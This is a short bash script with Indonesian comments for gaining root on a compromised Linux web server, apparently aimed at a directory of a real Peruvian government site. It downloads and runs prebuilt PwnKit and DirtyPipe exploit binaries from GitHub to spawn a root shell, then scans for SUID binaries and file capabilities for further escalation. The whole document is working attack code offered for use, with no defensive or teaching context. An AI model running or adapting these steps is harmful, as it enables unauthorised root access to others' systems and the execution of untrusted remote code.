#!/bin/bash
# Root-AIO-Final - No GCC - SELinux Bypass
echo "[!] Starting Final Rooting Attempt..."

# Pindah ke direktori writable JBoss (PENTING!)
cd /var/www/html/seguridad.grml.gob.pe 2>/dev/null || cd /tmp

# --- METHOD 1: PwnKit (Static Binary) ---
# Menggunakan binary yang sudah jadi, tidak butuh compiler
echo "[*] Attempting Method 1: PwnKit (Pre-compiled)..."
curl -sL https://github.com/ly4k/PwnKit/raw/main/PwnKit -o pk
chmod +x pk
./pk id && ./pk /bin/sh && exit

# --- METHOD 2: DirtyPipe (Static Binary) ---
# Menembus Kernel 5.4.17 (Oracle UEK) secara langsung
if [ $(id -u) -ne 0 ]; then
    echo "[*] Attempting Method 2: DirtyPipe (Pre-compiled)..."
    curl -sL https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1 -o dp
    chmod +x dp
    # Trigger exploit lewat SUID binary 'su'
    ./dp /usr/bin/su
fi

# --- METHOD 3: SUID Scan (Check for custom binaries) ---
echo "[*] Scanning for exploitable SUID..."
find / -perm -4000 -type f 2>/dev/null | grep -v 'snap' | xargs ls -la 2>/dev/null

# --- METHOD 4: Capabilities ---
echo "[*] Checking Capabilities..."
/usr/sbin/getcap -r / 2>/dev/null
